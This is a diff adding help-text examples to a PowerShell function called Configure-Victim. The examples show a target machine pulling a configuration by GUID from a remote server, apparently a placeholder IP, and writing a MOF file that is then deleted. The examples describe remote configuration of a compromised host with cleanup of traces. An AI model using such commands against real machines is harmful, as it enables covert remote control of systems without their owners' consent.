@@ -24,7 +24,21 @@ Optional parameter of the temporary MOF file location. If  parameter is not supp
 
 .EXAMPLE
 
-WRITE EXAMPLES
+PS C:\> Configure-Victim -GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d -Server 8.8.8.8
+
+Description
+-----------
+Victim downloads configuration with GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d from the server at 8.8.8.8.
+
+.EXAMPLE
+
+PS C:\> Configure-Victim -GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d -Server 8.8.8.8 -MofPath C:\Temp\Temp.mof
+
+Description
+-----------
+
+Same functionality as prior example example temporary mof file is written to 'C:\Temp\Temp.mof'.
+Note: In both cases the mof file is temporary and deleted before script terminates.
 
 
 #>
